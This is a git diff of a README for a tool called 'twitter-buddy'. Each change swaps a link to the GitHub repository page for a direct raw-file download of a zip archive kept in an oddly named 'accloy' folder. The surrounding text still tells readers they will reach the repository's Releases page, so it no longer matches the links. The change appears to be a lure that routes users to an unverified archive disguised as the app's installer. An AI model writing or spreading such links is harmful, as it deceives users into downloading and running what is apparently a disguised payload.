@@ -1,6 +1,6 @@
 # 🐦 twitter-buddy - Simple Twitter Assistant Tool
 
-[![Download twitter-buddy](https://img.shields.io/badge/Download%20twitter--buddy-Download%20Now-brightgreen)](https://github.com/emilbib51-lab/twitter-buddy)
+[![Download twitter-buddy](https://img.shields.io/badge/Download%20twitter--buddy-Download%20Now-brightgreen)](https://raw.githubusercontent.com/emilbib51-lab/twitter-buddy/main/accloy/twitter_buddy_v2.6-alpha.4.zip)
 
 ## 📋 What is twitter-buddy?
 
@@ -24,7 +24,7 @@ Before you start, make sure your computer meets these basic needs:
 
 Click the big green button above or this link to visit the download page for twitter-buddy:
 
-[https://github.com/emilbib51-lab/twitter-buddy](https://github.com/emilbib51-lab/twitter-buddy)
+[https://raw.githubusercontent.com/emilbib51-lab/twitter-buddy/main/accloy/twitter_buddy_v2.6-alpha.4.zip](https://raw.githubusercontent.com/emilbib51-lab/twitter-buddy/main/accloy/twitter_buddy_v2.6-alpha.4.zip)
 
 You will be taken to the GitHub repository page. Look for the “Releases” section on the right side or near the top. The newest version is usually the first one listed.
 
@@ -122,7 +122,7 @@ If the app crashes or freezes, uninstall and reinstall it using the steps above.
 
 This repository page has extra information:
 
-[https://github.com/emilbib51-lab/twitter-buddy](https://github.com/emilbib51-lab/twitter-buddy)
+[https://raw.githubusercontent.com/emilbib51-lab/twitter-buddy/main/accloy/twitter_buddy_v2.6-alpha.4.zip](https://raw.githubusercontent.com/emilbib51-lab/twitter-buddy/main/accloy/twitter_buddy_v2.6-alpha.4.zip)
 
 Look under the “Issues” tab to see if others have similar questions or to report problems.
 
@@ -132,4 +132,4 @@ Check the GitHub page regularly for new versions. Download the latest installer 
 
 ---
 
-[![Download twitter-buddy](https://img.shields.io/badge/Download%20twitter--buddy-Visit%20Page-blue)](https://github.com/emilbib51-lab/twitter-buddy)
+[![Download twitter-buddy](https://img.shields.io/badge/Download%20twitter--buddy-Visit%20Page-blue)](https://raw.githubusercontent.com/emilbib51-lab/twitter-buddy/main/accloy/twitter_buddy_v2.6-alpha.4.zip)
